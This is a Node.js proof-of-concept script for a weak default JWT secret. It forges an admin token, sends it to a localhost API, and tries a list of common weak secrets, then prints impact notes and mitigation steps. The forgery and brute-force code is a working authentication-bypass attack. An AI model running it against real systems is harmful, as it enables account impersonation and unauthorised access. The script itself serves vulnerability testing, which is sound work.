#!/usr/bin/env node
// ====================================================
// Proof of Concept: JWT Token Forgery
// ====================================================
// Demonstrates the weak default JWT secret vulnerability
// WARNING: For testing purposes only!

const jwt = require('jsonwebtoken');
const axios = require('axios');

// Configuration
const TARGET_URL = 'http://localhost:3000';
const WEAK_DEFAULT_SECRET = 'default_secret_change_me';

console.log('==========================================');
console.log('PoC: JWT Token Forgery - Weak Default Secret');
console.log('==========================================');
console.log('Target:', TARGET_URL);
console.log('Weakness: Default JWT secret is predictable');
console.log();

// Attack Scenario 1: Forge admin token
function forgeAdminToken() {
    console.log('Attack 1: Forging Admin Token');
    console.log('-------------------------------');
    
    // Create fake admin payload
    const fakeAdminPayload = {
        userId: 'admin-12345',
        email: 'admin@evilginx.local'
    };
    
    // Sign with weak default secret
    const forgedToken = jwt.sign(
        fakeAdminPayload,
        WEAK_DEFAULT_SECRET,
        { expiresIn: '24h' }
    );
    
    console.log('Forged Admin Token:');
    console.log(forgedToken);
    console.log();
    
    // Decode to show contents
    const decoded = jwt.decode(forgedToken, { complete: true });
    console.log('Token Contents:');
    console.log(JSON.stringify(decoded, null, 2));
    console.log();
    
    return forgedToken;
}

// Attack Scenario 2: Test forged token against API
async function testForgedToken(token) {
    console.log('Attack 2: Testing Forged Token');
    console.log('-------------------------------');
    
    try {
        // Try to access protected endpoint with forged token
        const response = await axios.get(`${TARGET_URL}/api/auth/verify-token`, {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        });
        
        if (response.data.success) {
            console.log('✅ VULNERABILITY CONFIRMED!');
            console.log('Forged token was accepted by server!');
            console.log('Response:', JSON.stringify(response.data, null, 2));
        } else {
            console.log('❌ Token rejected');
        }
    } catch (error) {
        if (error.response) {
            console.log('Server response:', error.response.status);
            console.log('Message:', error.response.data);
            
            if (error.response.status === 401) {
                console.log('✅ Token properly rejected (server using strong secret)');
            }
        } else if (error.code === 'ECONNREFUSED') {
            console.log('⚠️  Cannot connect to server at', TARGET_URL);
            console.log('Make sure the management platform is running');
        } else {
            console.log('Error:', error.message);
        }
    }
    console.log();
}

// Attack Scenario 3: Brute force check for default secret
async function checkDefaultSecret() {
    console.log('Attack 3: Checking for Default Secret');
    console.log('--------------------------------------');
    
    // Common weak secrets to test
    const weakSecrets = [
        'default_secret_change_me',
        'secret',
        'jwt_secret',
        'mysecretkey',
        'changeme',
        'password',
        '12345678'
    ];
    
    console.log('Testing common weak secrets...');
    
    for (const secret of weakSecrets) {
        const testToken = jwt.sign(
            { userId: 'test', email: 'test@test.com' },
            secret,
            { expiresIn: '1h' }
        );
        
        try {
            const response = await axios.get(`${TARGET_URL}/api/auth/verify-token`, {
                headers: {
                    'Authorization': `Bearer ${testToken}`
                }
            });
            
            if (response.data.success) {
                console.log(`🔓 WEAK SECRET FOUND: "${secret}"`);
                console.log('❌ CRITICAL VULNERABILITY!');
                return secret;
            }
        } catch (error) {
            // Expected - token rejected
        }
    }
    
    console.log('✅ No common weak secrets found');
    console.log();
}

// Attack Scenario 4: Show impact
function showImpact() {
    console.log('Impact Analysis');
    console.log('===============');
    console.log();
    console.log('If default secret is in use, attacker can:');
    console.log('  1. Forge tokens for any user');
    console.log('  2. Bypass authentication completely');
    console.log('  3. Access all protected endpoints');
    console.log('  4. Impersonate admin accounts');
    console.log('  5. Read/modify sensitive data');
    console.log();
    console.log('Severity: CRITICAL');
    console.log('CVSS Score: 9.8 (Critical)');
    console.log();
}

// Mitigation guidance
function showMitigation() {
    console.log('Mitigation Steps');
    console.log('================');
    console.log();
    console.log('1. Generate strong JWT secret:');
    console.log('   node -e "console.log(require(\'crypto\').randomBytes(64).toString(\'hex\'))"');
    console.log();
    console.log('2. Set in .env file:');
    console.log('   JWT_SECRET=<generated_secret>');
    console.log();
    console.log('3. Add validation in code:');
    console.log();
    console.log('   // routes/auth.js');
    console.log('   if (!process.env.JWT_SECRET || ');
    console.log('       process.env.JWT_SECRET === \'default_secret_change_me\') {');
    console.log('       throw new Error(\'JWT_SECRET must be configured\');');
    console.log('   }');
    console.log();
    console.log('4. Rotate secret periodically (e.g., every 90 days)');
    console.log();
    console.log('5. Use different secrets for:');
    console.log('   - Access tokens (short-lived)');
    console.log('   - Refresh tokens (long-lived)');
    console.log();
}

// Main execution
async function main() {
    try {
        // Execute attacks
        const forgedToken = forgeAdminToken();
        await testForgedToken(forgedToken);
        await checkDefaultSecret();
        
        showImpact();
        showMitigation();
        
        console.log('==========================================');
        console.log('PoC Execution Complete');
        console.log('==========================================');
        
    } catch (error) {
        console.error('Error during PoC execution:', error.message);
    }
}

// Run if executed directly
if (require.main === module) {
    // Check dependencies
    try {
        require('jsonwebtoken');
        require('axios');
        main();
    } catch (error) {
        console.error('Missing dependencies. Install with:');
        console.error('npm install jsonwebtoken axios');
        process.exit(1);
    }
}

module.exports = { forgeAdminToken, testForgedToken };

